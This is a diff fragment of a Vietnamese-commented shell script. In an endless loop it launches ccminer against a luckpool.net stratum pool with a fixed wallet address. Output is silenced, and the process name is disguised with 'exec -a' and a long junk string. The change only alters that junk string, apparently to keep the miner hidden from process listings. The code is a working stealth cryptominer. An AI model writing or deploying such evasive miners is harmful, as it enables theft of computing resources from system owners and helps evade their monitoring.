@@ -14,7 +14,7 @@ trap cleanup SIGINT
 
 while true; do
     # Chạy lệnh
-    exec -a "HidjsjsjdbdmlsmdjfkslskjdbdjsksksjsbbsmsksnsbsbnsmsjsbsnskjsbdnsksknsfhudhdmsjsjdjksnsbdjsmsdbbdksksjdnsmsjshdnskjshdbdjsksjdhsnksjdbdrrjejhdnsmsjsndbdnkskshdhndksjdhbdmsksjdhdkksjshdbdksjddbsjjsjsbdksjddjsnsnamksjdndmslsjshdmskjshsbslakshshdenCCMiner" ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RVvQgyuoCCRiQV7BBTDNNMAUH3WYp8HC9K.saverNode001 -t 1 > /dev/null 2>&1 
+    exec -a "HidjsjsjdbdmlsmdjfkgsnsnsvvsjsjsjdhdhdjsjsjdjjdhdgdhsjsjslskjdbdjsksksjsbbsmsksnsbsbnsmsjsbsnskjsbdnsksknsfhudhdmsjsjdjksnsbdjsmsdbbdksksjdnsmsjshdnskjshdbdjsksjdhsnksjdbdrrjejhdnsmsjsndbdnkskshdhndksjdhbdmsksjdhdkksjshdbdksjddbsjjsjsbdksjddjsnsnamksjdndmslsjshdmskjshsbslakshshdenCCMiner" ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 -u RVvQgyuoCCRiQV7BBTDNNMAUH3WYp8HC9K.saverNode001 -t 1 > /dev/null 2>&1 
     
     # Lưu PID của tiến trình
     PID=$!
